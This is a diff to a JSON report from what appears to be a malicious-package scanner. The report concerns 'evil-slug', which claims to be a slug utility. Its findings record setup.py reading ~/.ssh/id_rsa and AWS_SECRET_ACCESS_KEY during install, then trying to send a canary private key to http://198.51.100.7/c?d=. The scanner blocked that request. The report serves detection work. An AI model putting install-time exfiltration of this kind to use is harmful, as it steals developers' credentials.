@@ -9,7 +9,7 @@
  },
  "verdict": "MALICIOUS-EVIDENT",
  "action": "BLOCK",
- "score": 29.0,
+ "score": 38.0,
  "confidence": "high",
  "summary": "evil-slug: behaviour contradicts its claims. Independent signals: canary_access, canary_in_bytes, network_unclaimed.",
  "findings": [
@@ -66,7 +66,59 @@
      }
     }
    ],
-   "explanation": "During install (install, profile dev), setup.py:5 read the sensitive file ~/.ssh/id_rsa. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: succeeded. Then install-phase network attempt to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f followed. Canary(ies): ssh_key."
+   "explanation": "The README says \u00abA tiny string utility that turns titles into URL slugs\u00bb (readme); during install under dev it read the sensitive file ~/.ssh/id_rsa at setup.py:5 and the fake secret ssh_key appeared in ~/.ssh/id_rsa. Outcome: succeeded. Then install-phase network attempt to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f followed. Canary(ies): ssh_key."
+  },
+  {
+   "id": "f3",
+   "rule": "capability_not_claimed",
+   "title": "env_secrets observed but not claimed",
+   "severity": "high",
+   "score": 10.0,
+   "capability": "env_secrets",
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": true,
+   "signal_class": "mismatch_other",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "A tiny string utility that turns titles into URL slugs",
+    "source": "readme"
+   },
+   "events": [
+    "ev1",
+    "ev6"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev1",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "succeeded",
+     "detail": {
+      "name": "AWS_SECRET_ACCESS_KEY"
+     }
+    },
+    {
+     "event_id": "ev6",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "ci",
+     "outcome": "succeeded",
+     "detail": {
+      "name": "AWS_SECRET_ACCESS_KEY"
+     }
+    }
+   ],
+   "explanation": "The README says \u00abA tiny string utility that turns titles into URL slugs\u00bb (readme); during install under dev it read the secret-looking environment variable AWS_SECRET_ACCESS_KEY at setup.py:6 and the fake secret aws_secret_env appeared in AWS_SECRET_ACCESS_KEY. Outcome: succeeded."
   },
   {
    "id": "f1",
@@ -108,66 +160,14 @@
      }
     }
    ],
-   "explanation": "During install (install, profile dev), setup.py:6 attempted network access to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: blocked. The request carried canary token(s): aws_secret_env, ssh_key."
-  },
-  {
-   "id": "f3",
-   "rule": "capability_not_claimed",
-   "title": "env_secrets observed but not claimed",
-   "severity": "medium",
-   "score": 5.0,
-   "capability": "env_secrets",
-   "phases": [
-    "install"
-   ],
-   "profiles": [
-    "ci",
-    "dev"
-   ],
-   "env_differential": false,
-   "canary_hit": false,
-   "signal_class": "mismatch_other",
-   "claim": {
-    "status": "not_claimed",
-    "quote": "A tiny string utility that turns titles into URL slugs",
-    "source": "readme"
-   },
-   "events": [
-    "ev1",
-    "ev6"
-   ],
-   "evidence": [
-    {
-     "event_id": "ev1",
-     "file": "/w/site/setup.py",
-     "line": 6,
-     "phase": "install",
-     "profile": "dev",
-     "outcome": "succeeded",
-     "detail": {
-      "name": "AWS_SECRET_ACCESS_KEY"
-     }
-    },
-    {
-     "event_id": "ev6",
-     "file": "/w/site/setup.py",
-     "line": 6,
-     "phase": "install",
-     "profile": "ci",
-     "outcome": "succeeded",
-     "detail": {
-      "name": "AWS_SECRET_ACCESS_KEY"
-     }
-    }
-   ],
-   "explanation": "During install (install, profile dev), setup.py:6 read the secret-looking environment variable AWS_SECRET_ACCESS_KEY. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: succeeded."
+   "explanation": "The README says \u00abA tiny string utility that turns titles into URL slugs\u00bb (readme); during install under dev it attempted network access to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f at setup.py:6 and the fake secret aws_secret_env, ssh_key appeared in http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f. Outcome: blocked. The request carried canary token(s): aws_secret_env, ssh_key."
   },
   {
    "id": "f2",
    "rule": "network_unclaimed",
    "title": "Network access in install phase not licensed by the package's claims",
-   "severity": "medium",
-   "score": 4.0,
+   "severity": "high",
+   "score": 8.0,
    "capability": "network",
    "phases": [
     "install"
@@ -177,7 +177,7 @@
     "dev"
    ],
    "env_differential": false,
-   "canary_hit": false,
+   "canary_hit": true,
    "signal_class": "network_unclaimed",
    "claim": {
     "status": "not_claimed",
@@ -266,7 +266,7 @@
      }
     }
    ],
-   "explanation": "During install (install, profile dev), setup.py:6 attempted network access to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: blocked."
+   "explanation": "The README says \u00abA tiny string utility that turns titles into URL slugs\u00bb (readme); during install under dev it attempted network access to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f at setup.py:6 and the fake secret aws_secret_env, ssh_key appeared in http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f. Outcome: blocked."
   }
  ],
  "independent_signals": [
@@ -314,5 +314,6 @@
   ],
   "claimed_capabilities": [],
   "unknown_intent": false
- }
+ },
+ "dependency_attribution": {}
 }
